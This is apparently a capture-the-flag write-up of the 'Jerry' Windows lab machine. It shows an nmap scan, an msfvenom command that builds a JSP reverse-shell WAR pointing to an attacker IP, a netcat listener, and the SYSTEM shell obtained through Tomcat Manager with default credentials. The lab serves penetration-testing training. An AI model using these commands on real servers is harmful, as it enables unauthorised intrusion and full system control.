# Jerry
Jerry is an Easy Windows machine, and is suggested practice for the OSCP Excam.

## Enumeration
### Nmap Scan
```bash
nmap -sC -sV -Pn 10.10.10.95
```
**Results**
```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 10:11 BST
Nmap scan report for 10.10.10.95
Host is up (0.11s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.75 seconds
```
We can see from the above results that there is an Apache Tomcat service running on port 8080. 

### Web Server
We can visit the Apache Tomcat webserver on ```http://10.10.10.95:8080```.

From here we can confirm again that the version that is running is ```7.0.88``` and that it corresponds with the version of Tomcat Nmap returned.

We can click around the web panel 

## Foothold
### Payload
We can generate a ```war``` payload using ```msfvenom```.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=1234 -f war > shell.war
```
We can upload this to to the Tomcat Manager. Creat a listener so that we can catch the incoming connection:
```bash
user@kali:~$ nc -lvnp 1234
listening on [any] 1234 ...
```
Now browse to ```http://10.10.10.95:8080/shell```. The payload will run and we will recieve a connection into our listener.
```bash
user@kali:~$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

We can check the contents of the current directory we are in using ```dir```.
```bash
C:\apache-tomcat-7.0.88>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\apache-tomcat-7.0.88

06/19/2018  04:07 AM    <DIR>          .
06/19/2018  04:07 AM    <DIR>          ..
06/19/2018  04:06 AM    <DIR>          bin
06/19/2018  06:47 AM    <DIR>          conf
06/19/2018  04:06 AM    <DIR>          lib
05/07/2018  02:16 PM            57,896 LICENSE
10/09/2020  07:04 AM    <DIR>          logs
05/07/2018  02:16 PM             1,275 NOTICE
05/07/2018  02:16 PM             9,600 RELEASE-NOTES
05/07/2018  02:16 PM            17,454 RUNNING.txt
06/19/2018  04:06 AM    <DIR>          temp
10/09/2020  08:34 PM    <DIR>          webapps
06/19/2018  04:34 AM    <DIR>          work
               4 File(s)         86,225 bytes
               9 Dir(s)  27,602,845,696 bytes free
```

### Flags
If we run ```whoami``` it turns out we're running as ```nt authority\system```. Not a very good idea to be running a vulnerable server as ```system```. 

We can now navigate to ```C:\Users\Administrator\Desktop\flags>``` and use ```type``` command to read the flag file. Both the user and root flags are in this file.

## What have we learned
##### Search
When hunting around for exploits, don't just look for ```Unauthenticated RCEs```. The Tomcat server was using default credentials that can we found in one of the status pages. Systems can be setup, but they might not be setup using best practices. Chaging the username and password from default would have prevented this.

##### msfvenom
This is a really cool tool. Having to creft payloads from scratch can be tiresome and without reason. Using msfvenom seriously speeds up the time and lowers the barrier for entry to get a foothold on the system.

## Further Reading
- Tomcat
- msfvenom
